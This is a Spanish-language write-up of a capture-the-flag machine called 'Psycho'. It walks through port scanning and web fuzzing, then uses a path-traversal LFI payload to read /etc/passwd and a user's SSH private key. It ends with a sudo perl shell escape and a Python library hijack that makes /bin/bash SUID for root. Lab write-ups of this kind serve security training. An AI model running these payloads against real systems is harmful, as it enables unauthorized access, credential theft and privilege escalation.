# Psycho
> Dificultad: Fácil

___

#### FASE RECOPILACIÓN:  

Primero, **Escaneamos** el objetivo en busca de puertos, servicios y versiones usando `nmap`:  

 `nmap -n -v -sV -sC --min-rate 5000 <IP>`  

[IMG]  

 Vemos que está abierto el puerto 80, el cual habla de una web-app. Una vez aclarado esto, proseguimos con una **Enumeración Web** usando, en este caso, `wfuzz`:  

 `wfuzz -c --hc 404 -t 200 -z file,<diccionario> -u "http://<IP>/FUZZ"`  

Después de mucha búsqueda, parece que `index.php` es lo más relevante. Entonces, dado que no hay más, proseguimos a **Buscar Vulnerabilidades** fuzzeando, en este caso, *Parámetros URL* en dicho recurso. Usamos `wfuzz` nuevamente:  
 
 `wfuzz -c --hc 404 -t 200 -z file,rockyou.txt -u "http://<IP>/index.php?FUZZ=1"`  

Encontramos a `secret`.  

___

#### FASE EXPLOTACIÓN (Ganar Acceso):  

Bien, probando y probando, encontramos que podemos intentar un LFI en dicho parámetro. Queda:  

`wfuzz -c --hc 404 -t 200 -z list,"../../../../../etc/passwd" -u "http://<IP>/index.php?secret=FUZZ"`  

o directamente en el navegador:  

`http://<IP>/index.php?secret=../../../../../etc/passwd`  

Bien, conseguimos leer el archivo `/etc/passwd` con lo cual ya podemos **Enumerar Usuarios** y encontramos a `luisillo`, `ubuntu` y `vaxei`.  

Bien, de la misma manera que leimos `/etc/passwd` podemos seguir buscando otros ficheros importantes del sistema. Después de mucho intentar, hayamos a `http://<IP>/index.php?secret=../../../../../../../home/vaxei/.ssh/id_rsa`.  
El mismo trata de la **Clave Privada** del usuario `vaxei`, por lo cual ya podemos tener **footholding** quizás.  

Copiamos dicha clave localmente e intentamos `ssh -i id_rsa vaxei@<IP>`. Hacemos `whoami` y confirmamos acceso.  

___

#### FASE POST-EXPLOTACIÓN (Escalar Privilegios):  

Una de las primeras cosas que debemos hacer cuando ya tenemos un pie dentro es ver los **Privilegios Sudo** con `sudo -l`.  

El resultado nos mustra que podemos usar `/usr/bin/perl` como `luisillo` para convertirnos en él. Vamos a la web https://gtfobins.github.io/ y terminamos corriendo `sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash";'` como `vaxei`.  
Enseguida `whoami` y verificamos que somos `luisillo`.  

Chequeando los **Privilegios Sudo** con este usuario, lanzando `sudo -l`, vemos que tenemos sobre un script en particular usando Python3:  `/usr/bin/python3 /opt/paw.py`  

Al ejecutar `sudo /usr/bin/python3 /opt/paw.py` vemos que muestra un error al no encontrar la librería `/usr/lib/python3.12/subprocess.py` de la cual depende. Gracias a esto, nos damos cuenta que podemos crear nuestro propio python sub-script malicioso para ser llamado por `/opt/paw.py`. El script llama, por defecto, en su propio nivel al correr, es decir en el directorio que lo contiene.

Con esto en mente, nos movemos a `/opt/` y creamos un `subprocess.py` malicioso en `/opt` con:    

`cd /opt && nano subprocess.py` 

> ```
> #!/bin/usr/env python3
> import os;
> os.system("chmod u+s /bin/bash");
> ```  

Le damos permisos de ejecutable con `chmod +x subprocess.py`. 

Este `/opt/subprocess.py` malicioso le da permisos SUID a `/bin/bash` en caso de ser root y, como tenemos permisos sudo con `/usr/bin/python3 /opt/paw.py`, tendríamos éxito.  

Lanzamos, entonces, `sudo /usr/bin/python3 /opt/paw.py`, nos muestra un error sin importancia, corremos `bash -p` y somos root. Eso es todo.
